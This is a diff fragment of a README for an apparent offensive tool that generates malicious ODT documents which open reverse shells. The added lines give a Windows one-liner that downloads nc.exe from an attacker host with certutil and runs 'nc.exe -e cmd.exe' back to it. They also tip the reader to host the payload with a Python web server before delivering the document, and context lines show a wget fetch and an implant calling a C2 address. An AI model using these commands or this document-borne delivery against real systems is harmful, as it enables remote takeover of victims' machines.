@@ -191,7 +191,13 @@ python3 odt-revshell-generator.py 10.10.14.5 4444 --cmd 'wget http://10.10.14.5/
 
 # Run a custom binary
 python3 odt-revshell-generator.py 10.10.14.5 4444 --cmd '/tmp/implant -c2 10.10.14.5:8443'
+
+# Windows — create temp dir, download nc.exe via certutil, reverse shell (all-in-one)
+python3 odt-revshell-generator.py 10.10.14.5 4444 --os windows \
+  --cmd "mkdir C:\Windows\Temp\x; certutil -urlcache -f http://10.10.14.5:8080/nc.exe C:\Windows\Temp\x\nc.exe; C:\Windows\Temp\x\nc.exe -e cmd.exe 10.10.14.5 4444"
 ```
+
+> **Tip:** Host nc.exe on your attacker machine with `python3 -m http.server 8080` before delivering the ODT.
 
 Use `--pre-cmd` to run commands before the main reverse shell (runs synchronously):
 
